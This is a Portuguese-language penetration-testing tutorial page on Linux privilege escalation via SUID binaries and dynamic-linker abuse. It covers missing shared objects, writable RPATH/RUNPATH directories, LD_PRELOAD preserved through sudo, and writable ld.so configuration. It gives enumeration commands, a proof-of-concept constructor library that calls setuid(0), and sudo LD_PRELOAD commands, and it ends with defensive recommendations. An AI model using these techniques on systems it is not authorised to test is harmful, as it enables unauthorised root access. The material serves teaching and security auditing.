# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries geralmente são analisados quanto à execução direta de comandos, mas programas SUID personalizados também podem ser vulneráveis por meio do dynamic linker. O tema comum é simples: um executável privilegiado carrega código de um caminho ou de uma configuração que um usuário com menos privilégios pode influenciar.

Esta página se concentra em padrões genéricos de técnicas: bibliotecas ausentes, diretórios de bibliotecas com permissão de escrita, `RPATH`/`RUNPATH`, `LD_PRELOAD` por meio do sudo, configuração do linker e confusão com hardlinks SUID.

## Fast Enumeration

Comece encontrando arquivos SUID incomuns e verificando se eles são dynamically linked:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentre-se em locais não padrão, caminhos de aplicações personalizados, binários pertencentes ao root, mas localizados fora dos diretórios gerenciados por pacotes, e dependências carregadas de diretórios com permissão de escrita.

Verificações úteis de permissões de escrita:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Alguns binários SUID personalizados tentam carregar um shared object que não existe. Se o caminho ausente estiver em um diretório controlado pelo atacante, o binário poderá carregar código fornecido pelo atacante como o usuário efetivo.

Encontre buscas de bibliotecas malsucedidas:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Se o binário procurar por `libexample.so` em um caminho gravável, uma biblioteca mínima de demonstração pode usar um construtor. Mantenha a prova de impacto inofensiva durante a validação:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compile-o com o nome de arquivo exato que o binário tenta carregar:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
A condição explorável não é apenas a ausência da library. O atacante deve conseguir colocar um shared object compatível em um caminho que o loader privilegiado aceite.

## Diretório de Library com Permissão de Escrita

Às vezes, todas as dependências existem, mas um dos diretórios usados para resolvê-las permite escrita. Isso pode permitir substituir uma library carregada ou instalar uma library de prioridade mais alta com o mesmo nome.

Revise os caminhos das dependências:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Se o diretório tiver permissão de escrita, valide usando uma abordagem segura com cópia em um laboratório. Substituir system libraries em um host ativo pode interromper a autenticação, o gerenciamento de pacotes ou serviços críticos para a inicialização.

## RPATH e RUNPATH

`RPATH` e `RUNPATH` são entradas da seção dinâmica que informam ao loader onde procurar libraries. Elas são perigosas em programas SUID quando apontam para diretórios graváveis pelo atacante.

Detecte-as:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Exemplo de saída arriscada:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Se `/opt/app/lib` for gravável e o binário precisar de `libcustom.so`, o atacante poderá colocar um `libcustom.so` malicioso nesse diretório:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` e `RUNPATH` não são idênticos em todos os detalhes de resolução, mas, para a análise de privilege escalation, a pergunta prática é a mesma: o binário SUID pesquisa um diretório gravável pelo atacante em busca de um nome de library?

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Para programas normais, `LD_PRELOAD` e `LD_LIBRARY_PATH` podem forçar ou influenciar o carregamento de shared objects. Para programas SUID, o dynamic loader normalmente entra no modo de execução segura e ignora variáveis de ambiente perigosas.

Isso significa que um binário SUID comum geralmente não é vulnerável apenas porque o usuário pode definir `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
A exceção comum é a má configuração do sudo. Se `sudo -l` mostrar que uma variável como `LD_PRELOAD` ou `LD_LIBRARY_PATH` é preservada, um comando permitido pelo sudo poderá carregar código controlado pelo atacante:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Não confunda estes casos:

- `LD_PRELOAD` contra um binário SUID normal: geralmente bloqueado pela execução segura.
- `LD_PRELOAD` preservado pelo sudo: potencialmente explorável.
- `.so` ausente em um caminho com permissão de escrita: explorável quando o binário SUID carrega naturalmente esse caminho.
- `RPATH`/`RUNPATH` apontando para um diretório com permissão de escrita: explorável quando uma biblioteca necessária pode ser controlada.
- Acesso de escrita a `/etc/ld.so.preload` ou à configuração do linker: abrangência em todo o sistema e alto impacto.

## Configuração do Linker

O linker dinâmico também lê configurações do sistema, como `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, o cache do linker e, em alguns casos, `/etc/ld.so.preload`.

Verificações de alto valor:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Configurações do linker com permissão de escrita geralmente são mais graves do que um único binário SUID vulnerável, pois podem afetar muitos processos vinculados dinamicamente. `/etc/ld.so.preload` é especialmente perigoso porque pode forçar um shared object a ser carregado em processos privilegiados.

## SUID Hardlink Confusion

Hardlinks podem fazer o mesmo inode SUID aparecer com vários nomes. Isso é útil para ocultar um helper privilegiado, confundir a limpeza ou contornar revisões ingênuas baseadas em caminhos.

Encontre arquivos SUID com mais de um link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspecione todos os caminhos para o mesmo inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
O abuso não consiste em um hardlink alterar permissões. O abuso é a confusão de caminhos: um inode privilegiado pode ser acessível por meio de um nome que defensores ou scripts não esperam. Para obter mais detalhes sobre inodes e o fluxo de trabalho com hardlinks, consulte [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Notas defensivas

- Mantenha os binários SUID mínimos, auditados e gerenciados por pacotes sempre que possível.
- Evite entradas `RPATH`/`RUNPATH` apontando para diretórios graváveis ou gerenciados por aplicações.
- Mantenha os diretórios de bibliotecas pertencentes ao root e não graváveis por usuários comuns.
- Não preserve `LD_PRELOAD`, `LD_LIBRARY_PATH` ou variáveis semelhantes do loader através do sudo.
- Monitore `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e arquivos SUID inesperados.
- Revise arquivos SUID ligados por hardlinks e investigue wrappers SUID personalizados fora dos caminhos padrão do sistema.
{{#include ../../banners/hacktricks-training.md}}
